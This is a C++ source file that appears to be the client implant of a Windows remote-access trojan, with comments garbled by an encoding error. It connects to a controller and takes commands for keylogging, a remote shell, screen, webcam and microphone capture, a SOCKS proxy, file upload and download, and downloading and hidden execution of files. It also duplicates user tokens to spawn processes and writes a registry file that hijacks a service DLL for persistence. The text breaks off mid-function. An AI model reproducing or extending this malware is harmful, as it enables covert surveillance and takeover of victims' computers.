// MyClientMain.cpp: implementation of the CMyClientMain class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "Lzw.h"
#include "MyClientMain.h"
#include "MyMainTrans.h"
#include "MyVideoTrans.h"
#include "MyFrameTrans.h"
#include "MyTlntTrans.h"
#include "MyAudioTrans.h"
#include "MyDownTrans.h"
#include "MyUpTrans.h"
#include "MyKeyMTrans.h"
#include "MySocksModule.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMySocksModule* pSocketModule = NULL;
char m_SckFileName[256] = {0};
char m_KeyFilePath[256] = {0};

CMyClientMain::CMyClientMain()
{
	m_IsExitWork = FALSE;
}

CMyClientMain::~CMyClientMain()
{
	
}

void CMyClientMain::DoWork()
{
	//\\%skey.dll
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10282, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ȷ�����̼�¼����Ŀ¼
	m_gFunc.GetModuleFileName(m_ghInstance, m_KeyFilePath, 255);
	char* pFind = m_gFunc.strrchr(m_KeyFilePath, '\\');
	if(pFind != NULL)
	{
		*pFind = 0;
	}
	m_gFunc.sprintf(pFind, m_TmpStr, m_DllInfo.m_ServiceName);

	//�鿴�Ƿ��м��̼��
	if(m_DllInfo.m_IsKeyMon > 0)
	{
		m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_StartKeyThread, NULL, 0, NULL);
	}

	//\\%ssck.ini
	m_gFunc.GetMyString(10281, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//SOCKS�����ļ�
	m_gFunc.GetModuleFileName(m_ghInstance, m_SckFileName, 255);
	pFind = m_gFunc.strrchr(m_SckFileName, '\\');
	if(pFind != NULL)
	{
		*pFind = 0;
	}
	m_gFunc.sprintf(pFind, m_TmpStr, m_DllInfo.m_ServiceName);

	//����socks����
	BYTE* pSockInfo = NULL;
	DWORD nFileLen = 0;
	if(MyMainFunc::ReadMyFile(m_SckFileName, &pSockInfo, &nFileLen) && nFileLen == sizeof(MYSOCKSINFO))
	{
		pSocketModule = new CMySocksModule;
		pSocketModule->StartWork((LPMYSOCKSINFO) pSockInfo);
		delete [] pSockInfo;
	}
	
	//���ӷ�������ʼ����
	while(!m_IsExitWork)
	{
		//���ӵ�������
		if(!Create(WM_CONNECT_MAIN, (HWND) m_DllInfo.m_PassWord))
		{
			m_gFunc.Sleep(m_DllInfo.m_DelayTime);
			continue;
		}

		//�����������
		if(!GetCmdFromServer())
		{
			Close();
			break;
		}

		//�ر�����
		Close();
	}

	//�ر�SOCKS����
	if(pSocketModule != NULL)
	{
		pSocketModule->StopWork();
		delete pSocketModule;
		pSocketModule = NULL;
	}

	//֪ͨ������̨���ͻ��˳�
	Create(WM_CONNECT_CLIENT_DOWN, (HWND) m_DllInfo.m_PassWord);
	m_gFunc.Sleep(2000);
}

DWORD CMyClientMain::SSH_TlntThread(LPVOID lPvoid)
{
	CMyTlntTrans m_Trans;
	m_Trans.StartWork((HWND) lPvoid);
	return 0;
}

DWORD CMyClientMain::SSH_KeyMThread(LPVOID lPvoid)
{
	CMyKeyMTrans m_Trans;
	m_Trans.StartWork((HWND) lPvoid);
	return 0;
}

DWORD CMyClientMain::SSH_StopSocksThread(LPVOID lPvoid)
{
	//�ر�SOCKS����
	if(pSocketModule != NULL)
	{
		pSocketModule->StopWork();
		delete pSocketModule;
		pSocketModule = NULL;
		m_gFunc.DeleteFile(m_SckFileName);
	}
	return 0;
}

DWORD CMyClientMain::SSH_StartSocksThread(LPVOID lPvoid)
{
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_SOCKS, (HWND) lPvoid))
	{
		return 0;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return 0;
	}

	BYTE* pData = new BYTE[nLen];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return 0;
	}

	//�����ļ�
	LPMYSOCKSINFO pSockInfo = (LPMYSOCKSINFO) pData;
	if(!MyMainFunc::WriteMyFile(m_SckFileName, pData, sizeof(MYSOCKSINFO)))
	{
		delete [] pData;
		return 0;
	}

	//�ر�ԭ���ķ���
	if(pSocketModule != NULL)
	{
		pSocketModule->StopWork();
		delete pSocketModule;
		pSocketModule = NULL;
	}
	
	//����SOCKS����
	pSocketModule = new CMySocksModule;
	pSocketModule->StartWork(pSockInfo);
	delete [] pData;
	return 0;
}

DWORD CMyClientMain::SSH_VideoThread(LPVOID lPvoid)
{
	CMyVideoTrans m_Trans;
	m_Trans.StartWork((HWND) lPvoid);
	return 0;
}

DWORD CMyClientMain::SSH_AudioThread(LPVOID lPvoid)
{
	CMyAudioTrans m_Trans;
	m_Trans.StartWork((HWND) lPvoid);
	return 0;
}

DWORD CMyClientMain::SSH_MainThread(LPVOID lPvoid)
{
	CMyMainTrans m_Trans;
	m_Trans.StartWork((HWND) lPvoid);
	return 0;
}

DWORD CMyClientMain::SSH_CwndThread(LPVOID lPvoid)
{
	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if(m_SysTemType == Vista || m_SysTemType == Windows7)
	{
		StartUserProcess(WM_CONNECT_CWND, (HWND) lPvoid);
	}
	else
	{
		CMyMainTrans m_Trans;
		m_Trans.StartWork((HWND) lPvoid);
	}
	return 0;
}

DWORD CMyClientMain::SSH_FramThread(LPVOID lPvoid)
{
	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if(m_SysTemType == Vista || m_SysTemType == Windows7)
	{
		StartUserProcess(WM_CONNECT_FRAM, (HWND) lPvoid);
	}
	else
	{
		CMyFrameTrans m_Trans;
		m_Trans.StartWork((HWND) lPvoid);
	}
	return 0;
}

DWORD CMyClientMain::SSH_DlThread(LPVOID lPvoid)
{
	CMyDownTrans m_Trans;
	m_Trans.StartWork((HWND) lPvoid);
	return 0;
}

DWORD CMyClientMain::SSH_UpThread(LPVOID lPvoid)
{
	CMyUpTrans m_Trans;
	m_Trans.StartWork((HWND) lPvoid);
	return 0;
}

BOOL CMyClientMain::UpdateFile()
{
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_UPDA, 0))
	{
		return FALSE;
	}

	//���ݳ���
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return FALSE;
	}

	//�ļ�����
	BYTE* pData = new BYTE[nLen];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return FALSE;
	}

	//�޸�Ŀ��EXE
	ULONGLONG* pFindData = NULL;
	BYTE* pTmpData = pData;
	for(DWORD i = 0; i < nLen - sizeof(ULONGLONG); i++)
	{
		if(*((ULONGLONG*) &pTmpData[i]) == PS_UPDATA_FLAG)
		{	
			pFindData = (ULONGLONG*) &pTmpData[i];
			break;
		}
	}
	if(pFindData != NULL)
	{
		//�̳��ϵ�ID
		m_gFunc.memcpy(&pFindData[1], m_DllInfo.m_ID, 16);
	}
		
	//ȡ��ǰ�߳�ID
	DWORD nThreadId = m_gFunc.GetCurrentThreadId();

	//%08x.exe
	char m_TempStr[256] = {0};
	m_gFunc.GetMyString(10197, m_TempStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	char m_ExeFilePath[256] = {0};
	m_gFunc.GetTempPath(250, m_ExeFilePath);
	m_gFunc.sprintf(m_ExeFilePath + m_gFunc.strlen(m_ExeFilePath), m_TempStr, nThreadId);
	if(!MyMainFunc::WriteMyFile(m_ExeFilePath, pData, nLen))
	{
		delete [] pData;
		return FALSE;
	}
	delete [] pData;

	//�������½���
	PROCESS_INFORMATION pi = {0};
	STARTUPINFO siStartInfo = {0};
	GetStartupInfo(&siStartInfo);
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.dwFlags = STARTF_USESHOWWINDOW;
	siStartInfo.wShowWindow = SW_HIDE;
	return m_gFunc.CreateProcess(NULL, m_ExeFilePath, NULL, NULL, TRUE, 0, NULL, NULL, &siStartInfo, &pi);
}

DWORD CMyClientMain::SSH_FileThread(LPVOID lPvoid)
{
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_UPLO, (HWND) lPvoid))
	{
		return 0;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return 0;
	}

	BYTE* pData = new BYTE[nLen];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return 0;
	}

	LPMYUPLOADINFO pUpLoadInfo = (LPMYUPLOADINFO) pData;

	//%08x%s
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10285, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//�����ļ�
	char m_TmpFilePath[512] = {0};
	m_gFunc.GetTempPath(250, m_TmpFilePath);
	m_gFunc.sprintf(m_TmpFilePath + m_gFunc.strlen(m_TmpFilePath), m_TmpStr, m_gFunc.GetCurrentThreadId(), pUpLoadInfo->m_FileExt);
	if(!MyMainFunc::WriteMyFile(m_TmpFilePath, pData + sizeof(MYUPLOADINFO), nLen - sizeof(MYUPLOADINFO)))
	{
		delete [] pData;
		return 0;
	}

	//��������
	m_gFunc.ShellExecute(NULL, NULL, m_TmpFilePath, pUpLoadInfo->m_Param, NULL, pUpLoadInfo->m_IsShow);
	delete [] pData;
	return 0;
}

DWORD CMyClientMain::SSH_TuRlThread(LPVOID lPvoid)
{
	char m_Text[512] = {0};
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_TURL, (HWND) lPvoid))
	{
		return 0;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return 0;
	}

	char* pData = new char[nLen + 4096];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return 0;
	}
	pData[nLen] = 0x00;

	char* pFind = m_gFunc.strrchr(pData, '.');
	if(pFind == NULL)
	{
		delete [] pData;
		return 0;
	}

	//%08x%s
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10285, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	char m_TmpFilePath[256] = {0};
	m_gFunc.GetTempPath(250, m_TmpFilePath);
	m_gFunc.sprintf(m_TmpFilePath + m_gFunc.strlen(m_TmpFilePath), m_TmpStr, m_gFunc.GetCurrentThreadId(), pFind);
	if(MyMainFunc::GetUrlFile(pData, m_TmpFilePath))
	{
		m_gFunc.ShellExecute(NULL, NULL, m_TmpFilePath, NULL, NULL, SW_SHOW);
	}
	delete [] pData;
	return 0;
}

DWORD SSH_MessThread(LPVOID lPvoid)
{
	char m_Text[512] = {0};
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_MESS, (HWND) lPvoid))
	{
		return 0;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return 0;
	}

	char* pData = new char[nLen + 1];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return 0;
	}

	//����
	char m_WarnStr[256] = {0};
	m_gFunc.GetMyString(10272, m_WarnStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//��ʾ
	char m_NotifyStr[256] = {0};
	m_gFunc.GetMyString(10273, m_NotifyStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//����
	char m_ErrorStr[256] = {0};
	m_gFunc.GetMyString(10274, m_ErrorStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if(m_SysTemType == Vista || m_SysTemType == Windows7)
	{
		DWORD dwSessionID = m_gFunc.WTSGetActiveConsoleSessionId();
		DWORD nRet = 0;

		pData[nLen] = 0x00;
		if(pData[0] == '0')
		{
			m_gFunc.WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, dwSessionID, m_WarnStr, m_gFunc.strlen(m_WarnStr), pData + 1, m_gFunc.strlen(pData + 1), 
				MB_OKCANCEL | MB_ICONWARNING |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL, 30, &nRet, TRUE);
		}
		else if(pData[0] == '1')
		{
			m_gFunc.WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, dwSessionID, m_NotifyStr, m_gFunc.strlen(m_NotifyStr), pData + 1, m_gFunc.strlen(pData + 1), 
				MB_OKCANCEL | MB_ICONQUESTION |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL, 30, &nRet, 0);
		}
		else
		{
			m_gFunc.WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, dwSessionID, m_ErrorStr, m_gFunc.strlen(m_ErrorStr), pData + 1, m_gFunc.strlen(pData + 1), 
				MB_OKCANCEL | MB_ICONERROR |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL, 30, &nRet, 0);
		}
	}
	else
	{
		HDESK hOldDesktop = m_gFunc.GetThreadDesktop(m_gFunc.GetCurrentThreadId());
		HDESK hNewDesktop = m_gFunc.OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			m_gFunc.SetThreadDesktop(hNewDesktop);
		}
		pData[nLen] = 0x00;
		if(pData[0] == '0')
		{
			m_gFunc.MessageBox(NULL, pData + 1, m_WarnStr, MB_OKCANCEL | MB_ICONWARNING |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL);
		}
		else if(pData[0] == '1')
		{
			m_gFunc.MessageBox(NULL, pData + 1, m_NotifyStr, MB_OKCANCEL | MB_ICONQUESTION |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL);
		}
		else
		{
			m_gFunc.MessageBox(NULL, pData + 1, m_ErrorStr, MB_OKCANCEL | MB_ICONERROR |MB_SERVICE_NOTIFICATION|MB_SYSTEMMODAL);
		}
		m_gFunc.SetThreadDesktop(hOldDesktop);
	}
	delete [] pData;
	return 0;
}

void LinkToUrl(HWND hWnd)
{
	char m_Text[512] = {0};
	CMyClientTran m_Tran;
	if(!m_Tran.Create(WM_CONNECT_LINK, hWnd))
	{
		return;
	}

	//����
	DWORD nLen = 0;
	if(!m_Tran.RecvData(&nLen, sizeof(DWORD)))
	{
		return;
	}

	char* pData = new char[nLen + 1];
	if(!m_Tran.RecvData(pData, nLen))
	{
		delete [] pData;
		return;
	}
	pData[nLen] = 0x00;

	//Default IME
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10269, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.ShellExecute(NULL, NULL, m_TmpStr, pData + 1, NULL, (pData[0] == '0') ? SW_SHOW : SW_HIDE);
	delete [] pData;
}

DWORD SSH_LinkThread(LPVOID lPvoid)
{
	Type m_SysTemType = CMyClientTran::IsShellSysType();
	if(m_SysTemType == Vista || m_SysTemType == Windows7)
	{
		StartUserProcess(WM_CONNECT_LINK, (HWND) lPvoid);
	}
	else
	{
		LinkToUrl((HWND) lPvoid);
	}
	return 0;
}

BOOL StartUserProcess(DWORD nCmd, HWND hWnd)
{
    // Ϊ����ʾ���Ӹ��ӵ��û����棬������Ҫ��Session 0����
    // һ�����̣���������������������û������¡�
    // ���ǿ���ʹ��CreateProcessAsUserʵ����һ���ܡ�

    BOOL bSuccess = FALSE;
    STARTUPINFO si = {0};

    // ������Ϣ
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // ��õ�ǰSession ID
    DWORD dwSessionID = m_gFunc.WTSGetActiveConsoleSessionId();
    HANDLE hToken = NULL;

    // ��õ�ǰSession���û�����
    if(!m_gFunc.WTSQueryUserToken(dwSessionID, &hToken))
    {
        return FALSE;
    }

    //��������
    HANDLE hDuplicatedToken = NULL;
    if(!m_gFunc.DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityIdentification, TokenPrimary, &hDuplicatedToken))
    {
        return FALSE;
    }

    // �����û�Session����
    LPVOID lpEnvironment = NULL;
    if(!m_gFunc.CreateEnvironmentBlock(&lpEnvironment, hDuplicatedToken, FALSE))
    {
        return FALSE;
    }

	//rundll32.exe \"%s\",%s ServerAddr=%s;ServerPort=%d;Hwnd=%d;Cmd=%d;DdnsUrl=%s;
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10262, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//ServiceMain
	char m_FuncName[256] = {0};
	m_gFunc.GetMyString(10198, m_FuncName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	char m_DllFilePath[256] = {0};
	m_gFunc.GetModuleFileName(m_ghInstance, m_DllFilePath, 200);
	TCHAR m_Text[256] = {0};
	m_gFunc.sprintf(m_Text, m_TmpStr, m_DllFilePath, m_FuncName, m_DllInfo.m_ServerAddr, m_DllInfo.m_ServerPort, hWnd, nCmd, m_DllInfo.m_DdnsUrl);
 
    // �ڸ��Ƶ��û�Session��ִ��Ӧ�ó��򣬴������̡�
    // ͨ��������̣��Ϳ�����ʾ���ָ��ӵ��û�������
    if(!m_gFunc.CreateProcessAsUser(hDuplicatedToken, NULL, m_Text, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS | CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, NULL, &si, &pi))
    {
        return FALSE;
    }

    m_gFunc.CloseHandle(pi.hProcess);
    m_gFunc.CloseHandle(pi.hThread);
    m_gFunc.CloseHandle(hToken);
	m_gFunc.CloseHandle(hDuplicatedToken);
	m_gFunc.DestroyEnvironmentBlock(lpEnvironment);
    return 0;
}

BOOL GetStrValue(LPCTSTR pStr, LPCTSTR pName, LPTSTR pValue)
{
	//%s=
	char m_TempStr[256] = {0};
	m_gFunc.GetMyString(10290, m_TempStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	TCHAR m_Str[MAX_PATH] = {0};
	TCHAR m_Name[MAX_PATH] = {0};
	TCHAR m_Value[MAX_PATH] = {0};
	m_gFunc.sprintf(m_Name, m_TempStr, pName);
	m_gFunc.strcpy(m_Str, pStr);

	TCHAR* pStart = m_gFunc.strstr(m_Str, pName);
	if(pStart == NULL)
	{
		return FALSE;
	}
	pStart += m_gFunc.strlen(m_Name);
	
	TCHAR* pEnd = m_gFunc.strchr(pStart, ';');
	if(pEnd == NULL)
	{
		pEnd = m_Str + m_gFunc.strlen(m_Str);
	}
	m_gFunc.memcpy(pValue, pStart, (pEnd - pStart) * sizeof(TCHAR));
	pValue[pEnd - pStart] = 0;
	return TRUE;
}

void CMyClientMain::DoRundll32Work(char* sCmdLines)
{
	char m_TmpStr[256] = {0};
	char m_ValueName[256] = {0};

	//ServerAddr
	m_gFunc.GetMyString(10263, m_ValueName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(!GetStrValue(sCmdLines, m_ValueName, m_TmpStr))
	{
		return;
	}
	m_gFunc.strcpy(m_DllInfo.m_ServerAddr, m_TmpStr);

	//ServerPort
	m_gFunc.GetMyString(10264, m_ValueName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(!GetStrValue(sCmdLines, m_ValueName, m_TmpStr))
	{
		return;
	}
	m_DllInfo.m_ServerPort = m_gFunc.atoi(m_TmpStr);

	//Hwnd
	m_gFunc.GetMyString(10265, m_ValueName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(!GetStrValue(sCmdLines, m_ValueName, m_TmpStr))
	{
		return;
	}
	HWND hWnd = (HWND) m_gFunc.atoi(m_TmpStr);

	//Cmd
	m_gFunc.GetMyString(10266, m_ValueName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(!GetStrValue(sCmdLines, m_ValueName, m_TmpStr))
	{
		return;
	}
	DWORD nCmd = m_gFunc.atoi(m_TmpStr);

	//DdnsUrl
	m_gFunc.GetMyString(10267, m_ValueName, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	if(!GetStrValue(sCmdLines, m_ValueName, m_TmpStr))
	{
		return;
	}
	m_gFunc.strcpy(m_DllInfo.m_DdnsUrl, m_TmpStr);

	switch(nCmd)
	{
		//��Ļ���
		case WM_CONNECT_FRAM :
			{
				CMyFrameTrans m_Trans;
				m_Trans.StartWork(hWnd);
			}
			break;

		//���ڹ���
		case WM_CONNECT_CWND :
			{
				CMyMainTrans m_Trans;
				m_Trans.StartWork(hWnd);
			}
			break;

		//����ָ������
		case WM_CONNECT_LINK :
			LinkToUrl(hWnd);
			break;
	
		default : break;
	}
}

BOOL CMyClientMain::GetCmdFromServer()
{
	while(!m_IsExitWork)
	{
		//���ս�������
		CMDINFO m_CmdInfo = {0};
		if(!RecvData(&m_CmdInfo, sizeof(CMDINFO)))
		{
			//��Ҫ��������
			return TRUE;
		}

		//ִ�н�������
		switch(m_CmdInfo.m_Command)
		{
			//�ļ��������̹����������ע�������ļ�����
			case WM_CONNECT_FILE :
			case WM_CONNECT_PROC :
			case WM_CONNECT_SERV :
			case WM_CONNECT_REGT :
			case WM_CONNECT_FIND :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_MainThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//���ڹ���
			case WM_CONNECT_CWND :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_CwndThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//�����ն�
			case WM_CONNECT_TLNT :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_TlntThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//����SOCKS����
			case WM_CONNECT_SOCKS:
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_StartSocksThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//�ر�SOCKS����
			case WM_CONNECT_SOCKS_STOP:
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_StopSocksThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//���̼��
			case WM_CONNECT_GET_KEY :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_KeyMThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//��Ƶ���
			case WM_CONNECT_VIDEO :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_VideoThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//��Ƶ���
			case WM_CONNECT_AUDIO :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_AudioThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//��Ļ���
			case WM_CONNECT_FRAM :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SSH_FramThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//�ļ�����
			case WM_CONNECT_DL_FILE :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_DlThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//�ļ��ϴ�
			case WM_CONNECT_UP_FILE :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_UpThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//ִ���ļ�
			case WM_CONNECT_UPLO:
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SSH_FileThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//ִ��URL
			case WM_CONNECT_TURL :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_TuRlThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//��ʾ����
			case WM_CONNECT_MESS :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_MessThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//��������
			case WM_CONNECT_LINK :
				m_gFunc.CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) SSH_LinkThread, (LPVOID) m_CmdInfo.m_Hwnd, 0, NULL);
				break;

			//���³���
			case WM_CONNECT_UPDA :
				if(UpdateFile())
				{
					UninstallFile();
				}
				break;

			//ж�س���
			case CLIENT_PRO_UNINSTALL :
				UninstallFile();
				break;

			//��������
			case CLIENT_SYSTEM_RESTART :
				ShutDownSystem(FALSE);
				m_IsExitWork = TRUE;
				break;

			//�رջ���
			case CLIENT_SYSTEM_SHUTDOWN	:
				ShutDownSystem(TRUE);
				m_IsExitWork = TRUE;
				break;

			//��Ч����
			default : break;
		}
	}
	return FALSE;
}

#ifdef PS_VER_DINGZUO
void Make360RegStartTempFile(char* pDllPath, char* pFileName)
{
	//��reg�ļ�
	HANDLE hFile = m_gFunc.CreateFile(pFileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	DWORD nWriteLen = 0;

	//\r\n
	char m_ReturnStr[256] = {0};
	m_ReturnStr[0] = (char) 0x0d;
	m_ReturnStr[1] = (char) 0x0a;
	m_ReturnStr[2] = 0x00;

	//Windows Registry Editor Version 5.00
	char m_TmpStr[256] = {0};
	m_gFunc.GetMyString(10225, m_TmpStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_TmpStr, m_ReturnStr);
	m_gFunc.WriteFile(hFile, m_TmpStr, m_gFunc.strlen(m_TmpStr), &nWriteLen, NULL);

	//[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\Messenger]
	char m_MessageStr[256] = {0};
	m_gFunc.GetMyString(10291, m_MessageStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_MessageStr, m_ReturnStr);
	
	//\"Start\"=dword:00000004
	char m_StartStr[256] = {0};
	m_gFunc.GetMyString(10293, m_StartStr, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_StartStr, m_ReturnStr);
	
	m_gFunc.WriteFile(hFile, m_MessageStr, m_gFunc.strlen(m_MessageStr), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_StartStr, m_gFunc.strlen(m_StartStr), &nWriteLen, NULL);
	
	m_MessageStr[39] = '2';
	m_gFunc.WriteFile(hFile, m_MessageStr, m_gFunc.strlen(m_MessageStr), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_StartStr, m_gFunc.strlen(m_StartStr), &nWriteLen, NULL);

	m_MessageStr[39] = '3';
	m_gFunc.WriteFile(hFile, m_MessageStr, m_gFunc.strlen(m_MessageStr), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_StartStr, m_gFunc.strlen(m_StartStr), &nWriteLen, NULL);
	
	//[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\sens\\Parameters]
	char m_ControlSet[256] = {0};
	m_gFunc.GetMyString(10226, m_ControlSet, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_ControlSet, m_ReturnStr);
	m_gFunc.WriteFile(hFile, m_ControlSet, m_gFunc.strlen(m_ControlSet), &nWriteLen, NULL);

	//"ServiceDll"=hex(2):
	char m_ServiceDll[256] = {0};
	m_gFunc.GetMyString(10227, m_ServiceDll, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.WriteFile(hFile, m_ServiceDll, m_gFunc.strlen(m_ServiceDll), &nWriteLen, NULL);

	//%02x,00,
	char m_ByteX[256] = {0};
	m_gFunc.GetMyString(10228, m_ByteX, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);

	//00,00
	char m_ByteXAndReturn[256] = {0};
	m_gFunc.GetMyString(10229, m_ByteXAndReturn, m_gFunc.pModuleString, m_gFunc.nModuleStringLen);
	m_gFunc.strcat(m_ByteXAndReturn, m_ReturnStr);

	//ControlSet001
	for(DWORD i = 0; i < m_gFunc.strlen(pDllPath); i++)
	{
		char m_AsciiChar[20] = {0};
		m_gFunc.sprintf(m_AsciiChar, m_ByteX, pDllPath[i]);
		m_gFunc.WriteFile(hFile, m_AsciiChar, m_gFunc.strlen(m_AsciiChar), &nWriteLen, NULL);
	}
	m_gFunc.WriteFile(hFile, m_ByteXAndReturn, 7, &nWriteLen, NULL);

	//ControlSet002
	m_ControlSet[39] = '2';
	m_gFunc.WriteFile(hFile, m_ControlSet, m_gFunc.strlen(m_ControlSet), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_ServiceDll, m_gFunc.strlen(m_ServiceDll), &nWriteLen, NULL);
	for(i = 0; i < m_gFunc.strlen(pDllPath); i++)
	{
		char m_AsciiChar[20] = {0};
		m_gFunc.sprintf(m_AsciiChar, m_ByteX, pDllPath[i]);
		m_gFunc.WriteFile(hFile, m_AsciiChar, m_gFunc.strlen(m_AsciiChar), &nWriteLen, NULL);
	}
	m_gFunc.WriteFile(hFile, m_ByteXAndReturn, 7, &nWriteLen, NULL);
	
	//ControlSet003
	m_ControlSet[39] = '3';
	m_gFunc.WriteFile(hFile, m_ControlSet, m_gFunc.strlen(m_ControlSet), &nWriteLen, NULL);
	m_gFunc.WriteFile(hFile, m_ServiceDll, m_gFunc.strlen(m_ServiceDll), &nWriteLen, NULL);
	for(i = 0; i < m_gFunc.strlen(pDllPath); i++)
	{
		char m_AsciiChar[20] = {0};
		m_gFunc.sprintf(m_AsciiChar, m_ByteX, pDllPath[i]);
